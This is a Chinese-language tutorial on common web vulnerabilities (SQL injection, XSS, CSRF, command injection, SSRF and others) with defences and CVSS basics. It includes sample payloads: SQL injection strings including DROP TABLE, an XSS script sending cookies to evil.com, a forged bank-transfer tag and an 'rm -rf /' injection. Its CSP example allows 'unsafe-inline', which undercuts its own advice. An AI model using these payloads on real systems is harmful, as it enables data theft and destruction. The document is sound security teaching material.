# 常见网络安全漏洞详解

## SQL注入漏洞

### 漏洞描述
SQL注入（SQL Injection）是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意SQL代码，来操纵后端数据库。这是OWASP Top 10中常见的Web应用安全漏洞。

### 攻击原理
攻击者利用应用程序未正确过滤用户输入的漏洞，将SQL命令注入到查询语句中，从而绕过认证、窃取数据、修改数据库内容等。

### 常见攻击类型

#### 1. 经典SQL注入
```sql
-- 正常查询
SELECT * FROM users WHERE username = '$username'

-- 恶意输入：admin' OR '1'='1
-- 结果查询
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
-- 这将返回所有用户记录
```

#### 2. 盲注
当应用不返回错误信息时，攻击者通过布尔或时间延迟来判断查询结果。

#### 3. 联合查询注入
使用UNION操作符从其他表中提取数据。

```sql
' UNION SELECT username, password FROM users --
```

#### 4. 堆叠查询
在单个语句中执行多个SQL命令。

```sql
'; DROP TABLE users; --
```

### 防御措施

1. **使用参数化查询**
```python
# 不安全的方式
query = f"SELECT * FROM users WHERE username = '{username}'"

# 安全的方式
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

2. **输入验证和清理**
- 验证输入类型和格式
- 使用白名单而非黑名单
- 限制输入长度

3. **最小权限原则**
- 数据库用户只拥有必要的权限
- 避免使用root或admin账户

4. **使用ORM框架**
- ORM框架通常内置SQL注入防护
- 减少直接SQL查询

## 跨站脚本攻击（XSS）

### 漏洞描述
跨站脚本攻击（Cross-Site Scripting，XSS）是一种安全漏洞，攻击者可以在其他用户浏览的网页中注入恶意脚本。

### 攻击类型

#### 1. 存储型XSS
恶意脚本被永久存储在目标服务器上，每次用户访问受影响页面时都会执行。

#### 2. 反射型XSS
恶意脚本通过URL参数传递，当用户点击恶意链接时执行。

#### 3. DOM型XSS
恶意脚本通过修改页面的DOM环境执行。

### 攻击示例
```javascript
// 恶意脚本
<script>
  // 窃取Cookie
  var cookie = document.cookie;
  fetch('http://evil.com/steal?cookie=' + cookie);
  
  // 重定向到钓鱼网站
  window.location = 'http://evil.com/phishing';
</script>
```

### 防御措施

1. **输出编码**
```python
# HTML编码
import html
safe_output = html.escape(user_input)

# JavaScript编码
# 使用适当的编码库
```

2. **内容安全策略（CSP）**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

3. **输入验证**
- 验证所有用户输入
- 使用白名单验证

4. **HttpOnly Cookie**
```http
Set-Cookie: sessionid=abc123; HttpOnly
```

## 跨站请求伪造（CSRF）

### 漏洞描述
跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种攻击方式，攻击者诱导用户在已认证的Web应用上执行非预期的操作。

### 攻击原理
攻击者创建恶意网站或链接，当已认证的用户访问时，浏览器会自动发送包含认证Cookie的请求到目标网站。

### 攻击示例
```html
<!-- 恶意网站上的图片标签 -->
<img src="http://bank.com/transfer?to=attacker&amount=10000" />
```

### 防御措施

1. **CSRF令牌**
```python
# 生成令牌
csrf_token = generate_random_token()
session['csrf_token'] = csrf_token

# 验证令牌
if request.form.get('csrf_token') != session.get('csrf_token'):
    raise Exception('CSRF token mismatch')
```

2. **SameSite Cookie属性**
```http
Set-Cookie: sessionid=abc123; SameSite=Strict
```

3. **验证Referer头**
- 检查请求来源是否合法

4. **双重提交Cookie**
- 在Cookie和请求参数中都包含令牌

## 远程代码执行（RCE）

### 漏洞描述
远程代码执行（Remote Code Execution，RCE）漏洞允许攻击者在目标系统上执行任意代码。

### 常见场景

1. **命令注入**
```python
# 不安全的代码
os.system("ping " + user_input)

# 恶意输入：8.8.8.8; rm -rf /
```

2. **反序列化漏洞**
- 不安全的对象反序列化

3. **文件上传漏洞**
- 上传可执行文件

### 防御措施

1. **避免使用eval()和exec()**
2. **使用安全的API**
3. **输入验证和清理**
4. **最小权限原则**

## 文件包含漏洞

### 漏洞描述
文件包含漏洞允许攻击者包含并执行服务器上的任意文件。

### 类型

1. **本地文件包含（LFI）**
- 包含服务器上的本地文件

2. **远程文件包含（RFI）**
- 包含远程服务器上的文件

### 防御措施

1. **禁用allow_url_include**
2. **使用白名单验证**
3. **避免使用用户输入作为文件名**

## 缓冲区溢出

### 漏洞描述
缓冲区溢出发生在程序试图将数据写入固定长度的缓冲区时，超出了缓冲区的容量。

### 攻击原理
攻击者通过输入超长数据覆盖相邻内存，可能覆盖返回地址，从而控制程序执行流。

### 防御措施

1. **使用安全的函数**
2. **边界检查**
3. **使用现代编程语言**
4. **编译器保护机制**

## 服务器端请求伪造（SSRF）

### 漏洞描述
SSRF允许攻击者诱导服务器向攻击者控制的位置发送请求。

### 攻击场景
- 访问内部网络资源
- 端口扫描
- 读取本地文件（file://协议）

### 防御措施

1. **输入验证**
2. **网络分段**
3. **白名单验证**
4. **限制出站连接**

## 漏洞评分系统（CVSS）

### CVSS概述
通用漏洞评分系统（Common Vulnerability Scoring System）用于评估漏洞的严重程度。

### 评分范围
- 0.0-3.9：低风险
- 4.0-6.9：中风险
- 7.0-10.0：高风险

### 评分指标
- 基础指标（Base Metrics）
- 时间指标（Temporal Metrics）
- 环境指标（Environmental Metrics）

### 漏洞管理建议

1. **优先处理高风险漏洞**
2. **定期漏洞扫描**
3. **及时更新补丁**
4. **建立漏洞响应流程**